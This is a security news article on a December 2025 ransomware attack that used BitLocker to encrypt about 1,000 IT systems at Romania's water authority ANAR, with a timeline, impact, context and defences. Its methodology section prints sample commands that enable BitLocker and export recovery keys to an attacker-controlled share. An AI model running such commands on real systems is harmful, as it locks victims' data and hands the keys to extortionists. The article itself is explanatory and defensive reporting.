        <header class="article-header">
            <div class="article-category"><i class="fas fa-shield-alt"></i> Critical Infrastructure</div>
            <h1>Romania Water Authority Ransomware Attack: 1,000 Systems Encrypted Using BitLocker</h1>
            <p class="article-excerpt">Threat actors weaponize Windows' own encryption tool against Romania's
                national water authority, exposing critical infrastructure vulnerabilities across Eastern Europe.
            </p>
            <div class="article-meta">
                <span><i class="far fa-calendar-alt"></i> Attack: December 2025</span>
                <span><i class="fas fa-clock"></i> Published: Dec 25, 2025</span>
                <span><i class="fas fa-book-open"></i> 18 min read</span>
            </div>
        </header>

        <img src="/images/articles/romania-water-ransomware-2025.png"
            alt="Romania Water Authority Ransomware Attack" class="featured-image" loading="lazy">

        <div class="warning-box">
            <strong><i class="fas fa-exclamation-triangle"></i> Critical Infrastructure Attack:</strong> This attack
            on Romania's national water authority represents a significant escalation in ransomware targeting of
            critical infrastructure. While operational technology remained unaffected, approximately 1,000 IT
            systems were encrypted using living-off-the-land techniques.
        </div>

        <h2><i class="fas fa-file-alt"></i> Executive Summary</h2>
        <p>In December 2025, Romania's national water authority, <strong>Administrația Națională Apele Române
                (ANAR)</strong>, fell victim to a devastating ransomware attack that compromised approximately 1,000
            systems. What makes this attack particularly notable is the attackers' use of
            <strong>BitLocker</strong>—Windows' built-in encryption tool—to encrypt files and demand ransom,
            exemplifying the growing "Living Off the Land" (LOTL) trend in ransomware operations.</p>

        <p>The attack targeted IT infrastructure rather than operational technology (OT), meaning that
            hydrotechnical structures—dams, reservoirs, and water treatment facilities—remained operational.
            However, the incident highlights the precarious state of critical infrastructure cybersecurity in
            Eastern Europe and the potential consequences when IT/OT segmentation is not properly implemented.</p>

        <div class="stat-grid">
            <div class="stat-card">
                <span class="stat-value">~1,000</span>
                <span class="stat-label">Systems Encrypted</span>
            </div>
            <div class="stat-card">
                <span class="stat-value">BitLocker</span>
                <span class="stat-label">Attack Tool</span>
            </div>
            <div class="stat-card">
                <span class="stat-value">ANAR</span>
                <span class="stat-label">Target</span>
            </div>
            <div class="stat-card">
                <span class="stat-value">OT Safe</span>
                <span class="stat-label">Operations Status</span>
            </div>
        </div>

        <h2><i class="fas fa-building"></i> About the Target: ANAR</h2>

        <p><strong>Administrația Națională Apele Române (ANAR)</strong> is Romania's national water management
            authority, responsible for:</p>

        <ul>
            <li><strong>Water resource management:</strong> Managing Romania's rivers, lakes, and groundwater
                systems</li>
            <li><strong>Flood control:</strong> Operating dams, levees, and flood prevention infrastructure</li>
            <li><strong>Water quality monitoring:</strong> Environmental protection and pollution control</li>
            <li><strong>Hydrotechnical infrastructure:</strong> Maintaining hundreds of dams and water control
                structures</li>
            <li><strong>Permit issuance:</strong> Regulating water usage for industrial and agricultural purposes
            </li>
        </ul>

        <p>ANAR operates across Romania's entire territory, with regional branches managing local water resources.
            The organization is classified as <strong>critical national infrastructure</strong> under Romanian and
            EU law, making this attack particularly concerning from a national security perspective.</p>

        <h2><i class="fas fa-cogs"></i> Technical Analysis: BitLocker as a Weapon</h2>

        <h3>The Living Off the Land Approach</h3>

        <p>The attackers' use of BitLocker represents a sophisticated "Living Off the Land" (LOTL) technique. Rather
            than deploying custom ransomware that might be detected by security tools, the attackers weaponized a
            legitimate Windows feature that:</p>

        <ul>
            <li><strong>Is already present on all modern Windows systems</strong> - No need to download malware</li>
            <li><strong>Is signed by Microsoft</strong> - Trusted by security tools</li>
            <li><strong>Provides strong encryption</strong> - AES-256, virtually unbreakable without the key</li>
            <li><strong>Integrates with Active Directory</strong> - Can be deployed at scale via Group Policy</li>
        </ul>

        <div class="info-box">
            <strong><i class="fas fa-info-circle"></i> What is LOTL?</strong> Living Off the Land refers to
            techniques where attackers use legitimate tools already present on target systems rather than bringing
            in external malware. This approach evades detection because the tools being used are inherently trusted.
        </div>

        <h3>Likely Attack Chain</h3>

        <p>While specific details of the ANAR attack haven't been publicly disclosed, BitLocker-based ransomware
            attacks typically follow this pattern:</p>

        <ol>
            <li><strong>Initial Access:</strong> Likely through phishing, exposed RDP, or VPN vulnerability
                exploitation</li>
            <li><strong>Privilege Escalation:</strong> Gaining Domain Admin or equivalent privileges</li>
            <li><strong>Reconnaissance:</strong> Mapping the network and identifying high-value targets</li>
            <li><strong>Persistence:</strong> Establishing backdoor access for continued control</li>
            <li><strong>Disabling Defenses:</strong> Turning off security tools that might interfere</li>
            <li><strong>BitLocker Deployment:</strong> Using Group Policy or scripting to enable BitLocker across
                systems</li>
            <li><strong>Key Exfiltration:</strong> Capturing recovery keys before locking systems</li>
            <li><strong>Encryption:</strong> Systems encrypted with attacker-controlled keys</li>
            <li><strong>Ransom Demand:</strong> Victims contacted with payment demands</li>
        </ol>

        <h3>BitLocker Attack Methodology</h3>

        <p>The technical execution of a BitLocker-based attack might include commands like:</p>

        <pre><code># Enable BitLocker on C: drive with random password

manage-bde -on C: -RecoveryPassword -Used

Or via PowerShell for mass deployment

Enable-BitLocker -MountPoint “C:” -EncryptionMethod Aes256 -UsedSpaceOnly -RecoveryPasswordProtector

Export recovery key to attacker-controlled location

manage-bde -protectors -get C: > \attacker-server\keys%COMPUTERNAME%.txt

        <p>Once BitLocker is enabled and the system reboots, the recovery key is required to access data. If the
            attacker controls the only copy of the recovery key, the victim has no choice but to pay or lose their
            data.</p>

        <h2><i class="fas fa-history"></i> Timeline of Events</h2>

        <div class="timeline">
            <div class="timeline-item">
                <span class="timeline-date">December 2025 (Exact Date Undisclosed)</span>
                <span class="timeline-event">Threat actors gain initial access to ANAR's network through undisclosed
                    means. Reconnaissance and privilege escalation activities likely began.</span>
            </div>
            <div class="timeline-item">
                <span class="timeline-date">December 2025</span>
                <span class="timeline-event">Attackers deploy BitLocker across approximately 1,000 systems. File
                    encryption begins using Windows' native encryption capabilities.</span>
            </div>
            <div class="timeline-item">
                <span class="timeline-date">December 2025</span>
                <span class="timeline-event">ANAR detects the attack when systems become inaccessible. IT
                    infrastructure severely impacted. Staff resort to alternative communication methods.</span>
            </div>
            <div class="timeline-item">
                <span class="timeline-date">December 2025</span>
                <span class="timeline-event">Romanian authorities, including the National Cyber Security Directorate
                    (DNSC), notified. Investigation begins.</span>
            </div>
            <div class="timeline-item">
                <span class="timeline-date">December 2025</span>
                <span class="timeline-event">ANAR confirms hydrotechnical infrastructure (OT systems) remains
                    unaffected. Operations continue with manual procedures.</span>
            </div>
        </div>

        <h2><i class="fas fa-exclamation-circle"></i> Impact Assessment</h2>

        <h3>What Was Affected</h3>

        <table>
            <thead>
                <tr>
                    <th>System Type</th>
                    <th>Status</th>
                    <th>Impact</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>IT Infrastructure</td>
                    <td style="color: var(--accent-red);">Encrypted</td>
                    <td>~1,000 systems compromised</td>
                </tr>
                <tr>
                    <td>Email Systems</td>
                    <td style="color: var(--accent-red);">Disrupted</td>
                    <td>Staff using alternative communication</td>
                </tr>
                <tr>
                    <td>Administrative Systems</td>
                    <td style="color: var(--accent-red);">Offline</td>
                    <td>Permitting and documentation affected</td>
                </tr>
                <tr>
                    <td>OT/SCADA Systems</td>
                    <td style="color: var(--accent-green);">Unaffected</td>
                    <td>Dams and infrastructure operational</td>
                </tr>
                <tr>
                    <td>Hydrotechnical Operations</td>
                    <td style="color: var(--accent-green);">Normal</td>
                    <td>Water management continues</td>
                </tr>
            </tbody>
        </table>

        <h3>Critical Infrastructure Defense Gap</h3>

        <p>ANAR's IT systems were reportedly <strong>not protected by Romania's national defense cyber
                system</strong>. This reveals a significant gap in how critical infrastructure cybersecurity is
            managed in Romania and potentially other countries:</p>

        <ul>
            <li>Critical infrastructure IT systems may not receive the same protection as government networks</li>
            <li>Sector-specific agencies may be responsible for their own cybersecurity</li>
            <li>Resource and budget constraints affect security implementations</li>
            <li>Lack of centralized visibility into critical infrastructure security posture</li>
        </ul>

        <blockquote>
            "The incident highlights that critical infrastructure cannot rely solely on IT/OT segmentation. If IT
            systems are compromised, operational disruption is inevitable even if OT remains safe."
            <cite>— TheHGTech Analysis</cite>
        </blockquote>

        <h2><i class="fas fa-globe-europe"></i> Geopolitical Context</h2>

        <h3>Romania as a Target</h3>

        <p>Romania has become an increasingly attractive target for cyberattacks due to several factors:</p>

        <ul>
            <li><strong>NATO membership:</strong> As a NATO member, Romania hosts military installations including
                the Aegis Ashore missile defense system</li>
            <li><strong>Ukraine border:</strong> Romania shares a border with Ukraine and has been a key logistics
                hub during the ongoing conflict</li>
            <li><strong>EU membership:</strong> Access to EU systems and databases makes Romanian infrastructure
                valuable</li>
            <li><strong>Black Sea access:</strong> Strategic importance of Black Sea ports and infrastructure</li>
        </ul>

        <h3>Attribution Considerations</h3>

        <p>While no threat actor has been publicly attributed to this attack, several possibilities exist:</p>

        <ul>
            <li><strong>Financially motivated cybercriminals:</strong> Ransomware groups targeting critical
                infrastructure for payment</li>
            <li><strong>Hacktivist groups:</strong> Pro-Russian hacktivist groups have targeted Romanian
                infrastructure previously</li>
            <li><strong>State-sponsored actors:</strong> Nation-state actors using ransomware as cover for
                destructive operations</li>
        </ul>

        <p>The Danish Defence Intelligence Service recently attributed attacks on water utilities and DDoS attacks
            on Danish websites to pro-Russian hacktivist groups, suggesting a pattern of Eastern European water
            infrastructure targeting.</p>

        <h2><i class="fas fa-chart-line"></i> Critical Infrastructure Ransomware Trends</h2>

        <p>The ANAR attack fits into a broader trend of ransomware targeting critical infrastructure in 2025:</p>

        <table>
            <thead>
                <tr>
                    <th>Sector</th>
                    <th>Trend</th>
                    <th>Notable Incidents</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>Water Utilities</td>
                    <td style="color: var(--accent-red);">Increasing</td>
                    <td>ANAR (Romania), Multiple US utilities</td>
                </tr>
                <tr>
                    <td>Healthcare</td>
                    <td style="color: var(--accent-red);">High</td>
                    <td>NHS breaches, Hospital chains</td>
                </tr>
                <tr>
                    <td>Energy</td>
                    <td style="color: var(--accent-orange);">Moderate</td>
                    <td>Power grid targeting</td>
                </tr>
                <tr>
                    <td>Transportation</td>
                    <td style="color: var(--accent-orange);">Moderate</td>
                    <td>Port attacks, Rail disruptions</td>
                </tr>
            </tbody>
        </table>

        <h3>Why Water Utilities Are Targeted</h3>

        <ul>
            <li><strong>Essential service:</strong> Water is critical—creating pressure to pay quickly</li>
            <li><strong>Limited budgets:</strong> Water utilities often have less security funding than other
                sectors</li>
            <li><strong>Legacy systems:</strong> Aging infrastructure with known vulnerabilities</li>
            <li><strong>Fragmented security:</strong> Many utilities lack dedicated cybersecurity staff</li>
            <li><strong>Public impact:</strong> Disruption creates immediate public and political pressure</li>
        </ul>

        <h2><i class="fas fa-shield-alt"></i> Defense Recommendations</h2>

        <div class="success-box">
            <strong><i class="fas fa-check-circle"></i> For Critical Infrastructure Operators:</strong>
            <ol style="margin-top: 1rem; margin-bottom: 0;">
                <li><strong>Implement IT/OT Segmentation:</strong> Ensure operational technology is isolated from IT
                    networks</li>
                <li><strong>Control BitLocker:</strong> Use Group Policy to prevent unauthorized BitLocker
                    activation</li>
                <li><strong>Backup Recovery Keys:</strong> Centralize BitLocker key management with proper access
                    controls</li>
                <li><strong>Monitor for LOTL:</strong> Detect suspicious use of legitimate Windows tools</li>
                <li><strong>Air-Gap Critical Controls:</strong> Ensure manual override capabilities for essential
                    operations</li>
                <li><strong>Incident Response Plans:</strong> Develop and test plans specific to ransomware
                    scenarios</li>
            </ol>
        </div>

        <h3>Preventing BitLocker Abuse</h3>

        <p>Organizations can implement several controls to prevent BitLocker from being weaponized:</p>

        <h4>1. Group Policy Controls</h4>
        <pre><code>Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption

  • Require additional authentication at startup: Enabled

  • Store BitLocker recovery information in AD DS: Enabled

  • Do not enable BitLocker until recovery information is stored: Enabled

          <h4>2. Monitor BitLocker Events</h4>
      <p>Key Windows Event IDs to monitor:</p>
      <ul>
          <li><strong>Event ID 768:</strong> BitLocker protection enabled</li>
          <li><strong>Event ID 771:</strong> BitLocker protection disabled</li>
          <li><strong>Event ID 778:</strong> BitLocker recovery key exported</li>
      </ul>

      <h4>3. Privileged Access Management</h4>
      <p>Restrict who can enable BitLocker and access recovery keys through proper PAM implementation.</p>

      <h2><i class="fas fa-balance-scale"></i> Lessons for Other Critical Infrastructure</h2>

      <h3>1. IT Security Is Critical Infrastructure Security</h3>
      <p>Even with proper IT/OT segmentation, compromised IT systems lead to operational disruptions.
          Administrative functions, communications, and monitoring all depend on IT.</p>

      <h3>2. LOTL Attacks Are Extremely Effective</h3>
      <p>Using legitimate tools like BitLocker bypasses many traditional security controls. Organizations must
          monitor for suspicious use of trusted applications.</p>

      <h3>3. National Cyber Defense Must Cover All Critical Infrastructure</h3>
      <p>ANAR's systems weren't under Romania's national cyber defense umbrella. This gap exists in many countries
          and must be addressed.</p>

      <h3>4. Manual Fallback Procedures Are Essential</h3>
      <p>ANAR's ability to continue operations manually demonstrates the importance of offline procedures.
          Critical infrastructure must be able to operate without IT systems.</p>

      <h2><i class="fas fa-check-square"></i> Key Takeaways</h2>
      <div class="info-box">
          <strong><i class="fas fa-key"></i> Summary:</strong>
          <ul style="margin-top: 1rem; margin-bottom: 0;">
              <li>Romania's national water authority (ANAR) suffered a ransomware attack encrypting ~1,000 systems
              </li>
              <li>Attackers used BitLocker (Windows native encryption) as the ransomware tool—a Living Off the
                  Land technique</li>
              <li>Operational technology (dams, treatment facilities) remained unaffected due to IT/OT
                  segmentation</li>
              <li>The attack highlights gaps in critical infrastructure cybersecurity coverage in Eastern Europe
              </li>
              <li>Water utilities globally are increasingly targeted due to limited security resources</li>
              <li>Organizations must monitor for suspicious use of legitimate tools like BitLocker</li>
          </ul>
      </div>
